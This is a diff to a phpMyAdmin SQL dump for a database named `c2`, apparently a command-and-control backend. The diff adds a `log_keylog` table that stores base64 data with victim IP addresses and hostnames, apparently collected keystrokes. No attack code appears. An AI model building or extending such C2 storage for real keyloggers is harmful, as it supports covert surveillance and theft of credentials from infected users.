@@ -3,7 +3,7 @@
 -- https://www.phpmyadmin.net/
 --
 -- Host: 127.0.0.1
--- Creato il: Mar 21, 2023 alle 11:24
+-- Creato il: Mar 21, 2023 alle 14:45
 -- Versione del server: 10.4.27-MariaDB
 -- Versione PHP: 8.2.0
 
@@ -20,6 +20,20 @@ SET time_zone = "+00:00";
 --
 -- Database: `c2`
 --
+
+-- --------------------------------------------------------
+
+--
+-- Struttura della tabella `log_keylog`
+--
+
+CREATE TABLE `log_keylog` (
+  `id` int(11) NOT NULL,
+  `ip_address` varchar(200) NOT NULL,
+  `b64` longtext NOT NULL,
+  `timestamp` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
+  `hostname` varchar(100) NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
 
 -- --------------------------------------------------------
 
@@ -42,6 +56,12 @@ CREATE TABLE `log_monitor` (
 --
 
 --
+-- Indici per le tabelle `log_keylog`
+--
+ALTER TABLE `log_keylog`
+  ADD PRIMARY KEY (`id`);
+
+--
 -- Indici per le tabelle `log_monitor`
 --
 ALTER TABLE `log_monitor`
@@ -50,6 +70,12 @@ ALTER TABLE `log_monitor`
 --
 -- AUTO_INCREMENT per le tabelle scaricate
 --
+
+--
+-- AUTO_INCREMENT per la tabella `log_keylog`
+--
+ALTER TABLE `log_keylog`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
 
 --
 -- AUTO_INCREMENT per la tabella `log_monitor`
